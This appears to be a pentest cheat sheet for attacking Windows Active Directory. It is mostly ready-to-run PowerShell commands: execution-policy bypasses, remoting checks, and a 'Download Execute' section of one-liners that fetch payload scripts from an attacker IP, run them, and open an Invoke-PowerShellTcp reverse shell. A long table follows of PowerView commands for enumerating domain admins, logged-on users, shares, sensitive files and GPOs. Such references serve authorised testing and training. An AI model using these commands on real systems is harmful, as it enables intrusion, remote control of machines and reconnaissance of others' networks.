# Active-Directory
AD is a toolkit for advanced requeriments during pentest.

### PowerShell Execution Policy
```powershell.exe -ep bypass
powershell -nop -ep bypass
powershell -c
powershell -encodedcommand
$env:PSExecutionPolicyReference="bypass"
```
### Check PowerShell Remoting is enabled
```
Test-WSMan -ComputerName SRV1
Get-Service WinRM -ComputerName SRV1,SRV2,SRV3 | Select MachineName,Name,Status,StartupType
Test-WSMan -ComputerName SRV2 -Credential Company\Administrator
Test-WSMan -ComputerName SRV2 -Credential Company\Administrator -Authentication Default
```

### Enable PowerShell Remoting using PowerShell
```
Enable-PSRemoting
Enable-PSRemoting -Force
Enable-PSRemoting -SkipNetworkProfileCheck -Force
```

### Powershell Modules
```
Import-Module .\powerview.ps1
Get-Command -Module powerview.ps1
```

### Download Execute
```
powershell.exe -iex (New-Object Net.WebClient).DownloadString('http://172.16.1.104/payload.ps1' -UseBasicParsing)
powershell.exe -iex (iwr 'http://172.16.1.104/payload.ps1')
powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.X -Port 443
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/InvokePowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.X Port 443
$h=New-Object -ComObject Msxm12.XMLHTTP;$h.open('GET','http://172.16.1.104/payload.ps1',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://172.16.1.104/payload.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

### Domain Enumeration
Descriptions | Command 
------------ | ----------
Enumerate Native executables and .NET classes | `$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]` `$ADClass::GetCurrentDomain()`
Get Current Domain | `Get-NetDomain`
Get Object Of Domain (And Another Domain) | `Get-NetDomain -Domain petrolium.local`
Get Domain SID for current domain | `Get-DomainSID`
Get Domain Controllers For The Current Domain | `Get-NetDomainController`
Get Domain Controllers For Another Domain | `Get-NetDomainController -Domain globalbank.local`
Get Domain Policy For Current Domain |`Get-DomainPolicy`
Get Domain Policy For Current Domain |`(Get-DomainPolicy)."system access"`
Get Domain Policy For Another Domain |`Get-DomainPolicy -domain vpn.empire.local)."system access"`
Get A List Of Users In The Current Domain | `Get-NetUser \| select cn`
Get A List Of Users In The Current Domain | `Get-NetUser \| select -ExpandProperty samaccountname`
Get A List Of Users In The Current Domain | `Get-NetUser -Username summer.leonard`
Get List Of All Properties In The Current Domain | `Get-UserProperty`
Get List Of All Properties In The Current Domain | `Get-UserProperty -Properties pwdlastset`
Search In Description  | `Find-UserField -SearchField Description -SearchTerm "build"`
Search In Description | `Get-UserProperties -Properties homedirectory`
Search In Description| `Get-UserProperties -Properties memberof`
Search In Description| `Get-UserProperties -Properties description`
Search In Description| `Find-UserField -SearchField Description`
Computer Enumeration| `Get-NetComputer`
Computer Enumeration|`Get-NetComputer -OperatingSystem "*Server 2016*"`
Computer Enumeration| `Get-NetComputer -ComputerName dc.empire.local -FullData`
Get All The Groups  | `Get-NetGroup -Domain empire.local`
Get All The Groups  | `Get-NetGroup *admin*`
Get All The Members of the domain admins group | `Get-NetGroupMember -GroupName "Domain Admins" -Recurse` 
Get All The Members of the domain admins group |`Get-NetGroup -UserName "summer.leonard"`
List All The LocalGroups (non-priv s on DC) | `Get-NetLocalGroup -ComputerName dc.empire.local -ListGroups`
Get Members of All The Local Groups on a Machine (needs admin privs on non DC machines) | `Get-NetLocalGroup -ComputerName dc.empire.local -Recurse`
Get Actively Logged Users On a Computer (needs local admin rights on the target machine) | `Get-NetLoggedon -ComputerName dc.empire.local`
Get Locally Users on a computer (needs remote registry on the target) | `Get-LoggednLocal -ComputerName hq.empire.local`
Get the last logged user on a computer  | `Get-LastLoggedOn -ComputerName accounts.empire.local`
Find Shares On Hosts  | `Invoke-ShareFinder -Verbose`
Find Shares On Hosts  |` Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC`
Find Sensistive Files On computers | `Invoke-FileFinder -Verbose`
Get-All File Servers  | `Get-NetFileServer`
Get List Of GPO | `Get-NetGPO`
Get List Of GPO |`Get-NetGPO -ComputerName dc.empire.local`
Get GPO's which use Restricted Groups groups.xml  | `Get-NetGPOGroup`
Get users which are in a local group of a machine using GPO  | `Find-GPOComputerAdmin -ComputerName dc.empire.local`
Get-Machines where given user is member of a specific group | `Find-GPOLocation -UserName summer.leonard -Verbose`
Get-Ous in a domain (Organisation Unit) | `Get-NetOU -FullData`
Search Applied GPO Policy | `(Get-NetOU StundentMachines -FullData).gplink`






 
